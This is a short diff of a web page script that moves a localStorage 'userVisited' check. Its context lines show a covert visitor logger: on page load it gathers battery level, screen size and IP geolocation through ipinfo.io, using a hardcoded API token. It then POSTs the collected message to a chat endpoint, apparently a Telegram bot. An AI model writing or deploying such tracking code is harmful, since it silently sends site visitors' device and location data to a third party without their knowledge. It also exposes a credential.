@@ -45,6 +45,9 @@ document.addEventListener('DOMContentLoaded', function() {
         batteryLevel = battery.level * 100;
     });
 
+   if (!localStorage.getItem('userVisited')) 
+   localStorage.setItem('userVisited', 'true');
+
     screenWidth = window.screen.width;
     screenHeight = window.screen.height;
 
@@ -145,8 +148,6 @@ fetch('https://ipinfo.io/' + ip + '?token=afae6637fcf7bf')
         formData.append('chat_id', chatId);
         formData.append('text', message);
         formData.append('parse_mode', 'Markdown');
-        if (!localStorage.getItem('userVisited')) 
-        localStorage.setItem('userVisited', 'true');
         fetch(url, {
             method: 'POST',
             body: formData
